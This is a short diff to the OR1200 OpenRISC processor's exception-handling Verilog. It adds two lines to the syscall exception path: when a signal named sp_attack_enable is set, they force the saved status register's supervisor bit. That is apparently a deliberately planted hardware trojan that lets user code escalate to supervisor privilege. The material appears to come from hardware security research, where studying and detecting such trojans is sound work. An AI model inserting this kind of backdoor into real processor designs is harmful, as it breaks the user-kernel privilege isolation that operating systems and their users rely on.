@@ -1,0 +1,13 @@
+Index: or1200_except.v
+===================================================================
+--- or1200_except.v	(revision 6459)
++++ or1200_except.v	(working copy)
+@@ -571,6 +571,8 @@
+ `ifdef OR1200_EXCEPT_SYSCALL
+ 		    14'b00_0000_01??_????: begin
+ 		       except_type <=  `OR1200_EXCEPT_SYSCALL;
++		       if(sp_attack_enable[1] == 1'b1)
++		       	       esr[0] <= 1'b1; 
+ 		       epcr <=  ex_dslot ? 
+ 			       wb_pc : delayed1_ex_dslot ? 
+ 			       id_pc : delayed2_ex_dslot ? 
